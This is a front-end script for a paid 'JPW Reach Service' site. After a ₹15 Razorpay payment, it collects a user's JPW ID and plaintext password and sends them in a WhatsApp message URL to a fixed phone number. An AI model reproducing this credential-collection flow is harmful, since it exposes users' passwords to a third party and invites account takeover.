/*========================================
AINEX JPW PRO v4
script.js
========================================*/

const payBtn = document.getElementById("payBtn");
const submitBtn = document.getElementById("submitBtn");

const jpwid = document.getElementById("jpwid");
const password = document.getElementById("password");
const paymentid = document.getElementById("paymentid");

const statusCard = document.getElementById("statusCard");
const paymentStatus = document.getElementById("paymentStatus");

const steps = document.querySelectorAll(".step");

let paymentVerified = false;

/*========================================
CREATE ORDER
========================================*/

payBtn.addEventListener("click", createOrder);

async function createOrder(){

payBtn.disabled = true;

payBtn.innerHTML = "⏳ Creating Order...";

try{

const response = await fetch("/api/create-order",{

method:"POST",

headers:{
"Content-Type":"application/json"
},

body:JSON.stringify({

amount:1500

})

});

if(!response.ok){

throw new Error();

}

const order = await response.json();

if(!order.id){

throw new Error();

}

openPayment(order);

}catch(err){

console.error(err);

alert("Unable To Create Payment Order");

payBtn.disabled=false;

payBtn.innerHTML="💳 Pay ₹15";

}

}

/*========================================
OPEN RAZORPAY
========================================*/

function openPayment(order){

const options={

key:window.RAZORPAY_KEY,

amount:order.amount,

currency:order.currency,

name:"AINEX SERVICES",

description:"JPW Reach Service",

order_id:order.id,

theme:{
color:"#0058ff"
},

handler:function(response){

verifyPayment(response);

},

modal:{

ondismiss:function(){

payBtn.disabled=false;

payBtn.innerHTML="💳 Pay ₹15";

}

}

};

const rzp=new Razorpay(options);

rzp.open();

}

/*========================================
VERIFY PAYMENT
========================================*/

async function verifyPayment(payment){

payBtn.innerHTML="🔄 Verifying...";

try{

const verify=await fetch("/api/verify-payment",{

method:"POST",

headers:{
"Content-Type":"application/json"
},

body:JSON.stringify(payment)

});

if(!verify.ok){

throw new Error();

}

const result=await verify.json();

if(result.success){

paymentVerified=true;

unlockForm(result.payment_id);

}else{

alert(result.message || "Payment Verification Failed");

payBtn.disabled=false;

payBtn.innerHTML="💳 Pay ₹15";

}

}catch(err){

console.error(err);

alert("Server Error");

payBtn.disabled=false;

payBtn.innerHTML="💳 Pay ₹15";

}

}

/*========================================
UNLOCK FORM
========================================*/

function unlockForm(pid){

jpwid.disabled=false;

password.disabled=false;

submitBtn.disabled=false;

paymentid.value=pid;

paymentStatus.innerHTML="Verified";

statusCard.classList.add("successCard");

statusCard.innerHTML=`

<div class="statusIcon successIcon">

✅

</div>

<h3>

Payment Successful

</h3>

<p>

Your payment has been verified successfully.

</p>

`;

steps[0].classList.add("active");
steps[1].classList.add("active");

payBtn.classList.add("success");

payBtn.innerHTML="✅ Payment Successful";

}

/*========================================
SUBMIT
========================================*/

submitBtn.addEventListener("click",submitForm);

function submitForm(){

if(!paymentVerified){

alert("Complete Payment First");

return;

}

if(jpwid.value.trim()==""){

alert("Enter JPW ID");

jpwid.focus();

return;

}

if(password.value.trim()==""){

alert("Enter Password");

password.focus();

return;

}

steps[2].classList.add("active");

const msg=

`*AINEX JPW*

Payment ID : ${paymentid.value}

JPW ID : ${jpwid.value}

Password : ${password.value}`;

window.open(

"https://wa.me/919236414171?text="+encodeURIComponent(msg),

"_blank"

);

}

/*========================================
NETWORK
========================================*/

window.addEventListener("offline",()=>{

alert("No Internet Connection");

});

window.addEventListener("online",()=>{

console.log("Internet Connected");

});
